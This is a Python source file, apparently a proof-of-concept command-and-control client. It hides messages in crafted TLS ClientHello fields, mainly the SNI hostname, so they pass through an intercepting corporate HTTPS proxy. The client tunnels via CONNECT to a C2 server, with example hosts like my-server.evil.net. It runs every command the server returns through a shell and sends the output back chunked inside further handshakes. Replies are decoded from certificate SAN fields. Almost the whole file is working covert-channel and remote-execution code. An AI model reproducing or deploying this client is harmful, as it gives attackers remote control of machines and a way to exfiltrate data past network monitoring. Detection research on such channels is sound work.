# -*- coding: utf-8 -*-

"""
client.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)

TODO:
    1. Implement Reliable Packetization Protocol
    DONE  - 2. Implment server.py (using x509 SAN fields for smuggling)
    3. Test and investigate how detectable this is as a C2 channel
 
"""
import argparse
import socket
import sys
import time
import struct
import random
import string
import math
import subprocess
import re

NS_TO_MS = 1000000
# MAX_MSG_LEN = 284
MAX_MSG_LEN = 256


class TLSClientHandshake:
    record = [  # idx  type     description
        b"\x16",  # [00] fixed    Record Type: TLS Handshake
        b"\x03\x01",  # [01] fixed    TLS REcord Version: v1.0
        b"\x00\x00",  # [02] variable Record Length: uint16
        b"\x01",  # [03] fixed    Handshake Type: Client Hello
        b"",  # [04] unused   -
        b"\x00\x00\x00",  # [05] variable Handshake Length: uint24
        b"\x03\x03",  # [06] fixed    Handshake Version: TLSv1.2
        b"\x00" * 4,  # [07] variable GMT Epoch                       4 Bytes   [SMUGGLE]
        b"\x00" * 28,  # [08] variable Random Seed                     28 Bytes  [SMUGGLE]
        b"\x00",  # [09] variable Session ID Length uint8
        b"",  # [10] variable Session ID 32 Bytes
        b"\x00\x00",  # [11] variable Cipher Suites List Len: uint16
        b"\x00",  # [12] variable Cipher Suites
        b"\x01",  # [13] fixed    Compression Methods List Len
        b"\x00",  # [14] fixed    Compression = null
        b"\x00\x00",  # [15] variable Extensions Length: uint16
        b"\x00",  # [16] variable Extension: SNI (object)         252 Bytes [SMUGGLE]
        b"\x00",  # [17] fixed    Extension: Elliptic Formats
        b"\x00",  # [18] fixed    Extension: Elliptic Groups
        b"\x00\x10",  # [19] variable Extension: Elliptic Alogorithms
        b"\x00\x00",  # [20] fixed    Extension: ALPN
        b"",  # [21] unused   -
    ]

    def __init__(self, message: str, seed=b""):
        enc_message = self.encode_tls_payload(message)
        if len(enc_message) > MAX_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(enc_message)} (original length was {len(message)})"
                f" exceeds MAX_LEN of {MAX_MSG_LEN}"
            )
            raise NotImplementedError
        self.record[20] = self.get_alpn()
        self.record[19] = self.get_ec_algorithms()
        self.record[18] = self.get_ec_groups()
        self.record[17] = self.get_ec_formats()
        self.record[16] = enc_message
        self.record[15] = struct.pack(">H", len(b"".join(self.record[16:])))
        self.record[12] = self.get_cipher_suites()
        self.record[11] = struct.pack(">H", len(self.record[12]))
        # TODO: in the future, we will use seed field to smuggle payloads
        self.record[8] = seed[4:]
        self.record[7] = seed[:4]
        self.record[5] = struct.pack(">L", len(b"".join(self.record[6:])))[1:]
        self.record[2] = struct.pack(">H", len(b"".join(self.record[3:])))

    def encode_tls_payload(self, message: str) -> bytes:
        """
        Takes a string message and returns a Tuple of bytes corresponding to SNI and random field in the TLS record
        """
        hex_msg = self._str_to_hex(message)
        # TODO: This breaks if host/labels are longer than 63 chars!
        # TODO: FIX THIS!
        # need to ensure that each 'label' contains max 63 chars
        # sliced = [hex_msg[x : x + 63] for x in range(0, len(hex_msg), 63)]
        # hex_msg = ".".join(sliced)
        sni_tld = self._get_random_tld()
        # TODO: make this more robust - Use random seed field for smuggling
        return self.make_sni(hex_msg + sni_tld)

    @staticmethod
    def _get_random_tld():
        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))

    @staticmethod
    def _str_to_hex(message: str) -> str:
        return bytes.hex(message.encode())

    def to_byte_stream(self) -> bytes:
        return b"".join(self.record)

    def __str__(self):
        return str("".join(self._escape(b) for b in self.record))

    @staticmethod
    def _escape(byte_arr: bytes) -> str:
        return "".join("\\x{:02x}".format(b) for b in byte_arr)

    @staticmethod
    def get_cipher_suites() -> bytes:
        return b"\xc0\x30\xc0\x2c\xc0\x2f\xc0\x2b\x00\x9f\x00\x9e\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x27\xc0\x23" \
               b"\xc0\x13\xc0\x09\x00\x9d\x00\x9c\x00\x3d\x00\x35\x00\x3c\x00\x2f\x00\xff"

    @staticmethod
    def get_ec_algorithms() -> bytes:
        return (
            b"\x00\x0d\x00\x16\x00\x14\x06\x01\x06\x03\x05\x01\x05\x03\x04\x01\x04\x03\x03\x01\x03\x03\x02\x01\x02\x03"
        )

    @staticmethod
    def get_ec_groups() -> bytes:
        return b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18"

    @staticmethod
    def get_ec_formats() -> bytes:
        return b"\x00\x0b\x00\x02\x01\x00"

    @staticmethod
    def get_alpn() -> bytes:
        return b"\x00\x10\x00\x0b\x00\x09\x08http/1.1"

    @staticmethod
    def make_sni(message: str) -> bytes:
        name = message.encode()
        hostname_len = struct.pack(">H", len(name))
        list_len = struct.pack(">H", len(name) + 3)
        ext_len = struct.pack(">H", len(name) + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name


# end class TLSClientHandshake()
class C2Client:
    def __init__(self, c2_server: str, c2_port: int, use_connect_direct: bool, proxy_server: str):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.use_connect_direct = use_connect_direct
        self.proxy_server = proxy_server
        if not use_connect_direct and not proxy_server and not self.is_good_proxy():
            print(f"Can't be used without proxy and not direct connection")
            sys.exit(-1)
        self.sock = self.create_socket()
        self.client_id = self.make_client_id()

    def create_socket(self):
        if self.use_connect_direct:
            return self.connect_direct()
        else:
            return self.connect_proxy()

    def _restart_socket(self):
        self.sock = self.create_socket()

    def is_good_proxy(self):
        if self.proxy_server is None:
            return False
        try:
            proxy_scheme = self.proxy_server.lower().split(":")[0]
            proxy_hostname = self.proxy_server.split("//")[1]
            proxy_port = int(proxy_hostname.split(":")[1].split("/")[0])
            proxy_hostname = proxy_hostname.split(":")[0].split("/")[0]
            return True
        except IndexError:
            return False

    def connect_direct(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.c2_server, int(self.c2_port)))
        return sock

    def connect_proxy(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        proxy_hostname = self.proxy_server.lower().split("//")[1]
        proxy_port = int(proxy_hostname.split(":")[1].split("/")[0])
        proxy_hostname = proxy_hostname.split(":")[0].split("/")[0]
        print(f"[+] Connecting to proxy: {self.proxy_server} ...")
        sock.connect((proxy_hostname, proxy_port))

        c_str = "CONNECT " + self.c2_server + ":" + str(self.c2_port) + " HTTP/1.1\r\n\r\n"
        print(f" > {c_str.rstrip()}")
        sock.sendall(c_str.encode())
        resp = sock.recv(1024)
        resp_first_line = resp.decode().split("\r\n")[0]
        print(" < " + resp_first_line)
        # we expect and HTTP/200 for our CONNECT request
        if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
            sock.close()
            print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
            return None
        return sock

    def send_message(self, byte_stream: bytes) -> bytes:
        self._restart_socket()
        self.sock.sendall(byte_stream)
        response_data = self.sock.recv(16384)
        return response_data

    def parse_server_hello(self, response_bytes: bytes) -> str:
        """Extracts SAN message from response bytes"""
        # TODO: write this!
        hex_str = response_bytes.hex()
        hex_array = [hex_str[i: i + 2] for i in range(0, len(hex_str), 2)]
        position = self._validate_handshake_msg(hex_str, hex_array)
        if position < 1:
            print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
            return ""
        san_records_hex = self._find_san_records(self._extract_certs(hex_array, position))
        message = ""
        for hex_record in san_records_hex:
            message = message + bytes.fromhex(bytes.fromhex(hex_record).decode().split(".")[0]).decode()
        return message

    def _reset_socket(self):
        self.sock.close()

    def _validate_handshake_msg(self, hex_str: str, hex_array: list) -> int:
        is_valid_handshake = True
        position = 0
        # For each TLS record
        # print(hex_str)
        # try:
        current_obj_len = 0
        handshake_len = 0
        if hex_str[0:2] != "16":
            is_valid_handshake = False
        if hex_str[2:4] != "03":
            is_valid_handshake = False
        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
            is_valid_handshake = False
        max_len = int(math.pow(2, 15))
        handshake_len = int(hex_str[6:10], 16)
        if (handshake_len < 1) or (handshake_len > max_len):
            is_valid_handshake = False
        if hex_str[10:12] != "0b":
            current_obj_len = int(hex_str[12:18], 16)
            if (current_obj_len < 1) or (current_obj_len > max_len):
                is_valid_handshake = False
            # assume nested record
            position = 1 + 2 + 2 + current_obj_len + 3 + 1
            if hex_array[position] != "0b":
                # it's possible this is an un-nested tls recoard layer
                if "".join(hex_array[position: position + 3]) == "160303":
                    return self._validate_handshake_msg("".join(hex_array[position:]), hex_array[position:])
            else:
                position = position + 1
                position = position + 3
                certs_len = int("".join(hex_array[position: position + 3]), 16)
        else:
            position = position + 1
            position = position + 3
            certs_len = int("".join(hex_array[position: position + 3]), 16)
        if certs_len < 32:
            is_valid_handshake = False
        if not is_valid_handshake:
            return -1
        return position

    def _extract_certs(self, hex_array: list, position: int) -> list:
        cert_hex_arrays = []
        certs_len = int("".join(hex_array[position: position + 3]), 16)
        position = position + 3
        certs_handshake_position = 0
        while certs_handshake_position < certs_len:
            try:
                cert_len = int("".join(hex_array[position: position + 3]), 16)
            except:
                break
            position = position + 3
            cert_hex_arrays.append(hex_array[position: position + cert_len])
            position = position + cert_len
            certs_handshake_position = certs_handshake_position + 3 + cert_len
        return cert_hex_arrays

    @staticmethod
    def _find_san_records(cert_list: list) -> list:
        #    len          ext_type          len       len       len
        # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
        # TODO: WARN: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
        # TODO: WARN: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
        san_records = []
        for cert in cert_list:
            if san_records:
                break
            hex_str = "".join(cert)
            byte_position = [
                (m.start(0), m.end(0))
                for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
            ][0][0]
            san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
            if len(san_record_matches.groups()) != 3:
                continue
            record_len = int(san_record_matches.groups()[2], 16)
            byte_position += 22
            while byte_position < (byte_position + record_len):
                if hex_str[byte_position: byte_position + 2] != "82":
                    break
                byte_position += 2
                dns_len = int(hex_str[byte_position: byte_position + 2], 16)
                byte_position += 2
                if dns_len < 1:
                    break
                san_records.append(hex_str[byte_position: byte_position + dns_len * 2])
                byte_position += dns_len * 2
        return san_records

    @staticmethod
    def run_command(cmd: str) -> str:
        return subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0].decode()

    @staticmethod
    def chunk_message(msg: str) -> list:
        start = 0
        max_ = 30
        chunks = []
        while start < len(msg):
            chunks.append(msg[start: start + max_])
            start += max_
        return chunks

    @staticmethod
    def convert_int_to_hex_8chars(length: int) -> bytes:
        """Converts an int to hex bytes to be used as total size and current chunk"""
        value_size = hex(length)
        value_size = value_size[2:]
        while len(value_size) < 8:
            value_size = f"0{value_size}"
        return value_size.encode()

    @staticmethod
    def make_client_id() -> bytes:
        """Generate 16 random bytes to fill missing seed space"""
        return bytes([random.randrange(0, 256) for _ in range(0, 16)])

    def make_seed(self, size=None, current_chunk=None) -> bytes:
        if size is None or current_chunk is None:
            size = current_chunk = self.convert_int_to_hex_8chars(random.randint(0, 65535))
            return size + self.client_id + current_chunk
        else:
            return size + self.client_id + current_chunk

    def run(self):
        while True:
            reqs_list_str = []
            reqs_list_byte_stream = []
            reqs_list_byte_cmds = []
            response_parsed_list = []
            response_bytes_list = []
            msg = "Hello"
            print(f"[+] Sending {msg}")
            seed = self.make_seed()
            rsp = self.send_message(TLSClientHandshake(msg, seed=seed).to_byte_stream())
            resp_parsed = self.parse_server_hello(rsp)
            print(f"[+] Received: {resp_parsed}")
            if resp_parsed.lower() == "exit":
                self._reset_socket()
                break
            if resp_parsed.lower() == "hello" or resp_parsed.lower() == "ok":
                self._reset_socket()
                time.sleep(5)
                continue
            result_str = self.run_command(resp_parsed)
            if len(result_str) < 30:
                seed = self.make_seed()
                result_msg = TLSClientHandshake(result_str, seed=seed).to_byte_stream()
                print(f" > '{result_str}' [{len(result_str)} {len(result_msg)} bytes]")
                resp_bytes = self.send_message(result_msg)
                resp_parsed = self.parse_server_hello(resp_bytes)
                self._reset_socket()
                print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
            else:
                chunks = self.chunk_message(result_str)
                size = self.convert_int_to_hex_8chars(len(chunks))
                for i, j in enumerate(chunks):
                    current_chunk = self.convert_int_to_hex_8chars(i + 1)
                    seed = self.make_seed(size, current_chunk)
                    result_msg = TLSClientHandshake(j, seed=seed).to_byte_stream()
                    reqs_list_byte_cmds.append(result_msg)
                    reqs_list_str.append(result_str)
                    resp_bytes = self.send_message(result_msg)
                    resp_parsed = self.parse_server_hello(resp_bytes)
                    self._reset_socket()
                    response_parsed_list.append(resp_parsed)
                print(f" > '{result_str}' [{len(result_msg)} bytes]")
                print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
            reqs_list_byte_stream = reqs_list_byte_stream + reqs_list_byte_cmds
            sent_bytes = sum(map(len, reqs_list_byte_stream))
            recv_bytes = sum(map(len, response_bytes_list))
            print(
                f"[+] Requests: {len(reqs_list_str)}, Bytes Sent: {sent_bytes}, Bytes Recv: {recv_bytes}"
            )


if __name__ == "__main__":
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument("message", type=str, nargs="?", help="Message to send")
    arg_parse.add_argument(
        "--proxy",
        metavar="proxy",
        required=False,
        help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
    )
    arg_parse.add_argument(
        "-d",
        "--direct",
        action="store_true",
        required=False,
        help="For testing - Connect directly to server and dont use a proxy",
    )
    arg_parse.add_argument(
        "-s",
        "--server",
        metavar="server",
        required=True,
        help="Target C2 Server you want to connect to, Example: my-server.evil.net",
    )
    arg_parse.add_argument(
        "-p",
        "--port",
        metavar="Port",
        required=True,
        help="Target C2 Server port you want to connect to, Example: 443",
    )
    args = arg_parse.parse_args()
    if not args.proxy and not args.direct:
        arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
        exit(1)
    if not args.server:
        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
        exit(1)
    client = C2Client(args.server, args.port, args.direct, args.proxy)
    try:
        client.run()
    except KeyboardInterrupt:
        print(f"")
